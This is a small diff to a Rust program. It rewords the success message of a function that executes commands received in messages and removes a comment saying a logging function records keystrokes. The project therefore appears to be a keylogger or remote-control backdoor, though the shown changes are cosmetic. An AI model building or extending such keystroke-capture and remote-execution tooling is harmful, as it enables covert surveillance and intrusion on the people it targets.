@@ -203,7 +203,7 @@ fn execute_command(message: &str) -> io::Result<String> {
                 Ok(stderr.to_string())
             } else {
                 Ok(format!(
-                    "Command '{}' executed successfully with no output.\n",
+                    "Command '{}' executed successfully.\n",
                     message
                 ))
             }
@@ -214,7 +214,6 @@ fn execute_command(message: &str) -> io::Result<String> {
     }
 }
 
-// Appends the keystrokes to a log file
 fn append_to_log(data: &str) -> io::Result<()> {
     let now = Local::now();
     let timestamp = now.format("%Y-%m-%d %H:%M:%S");
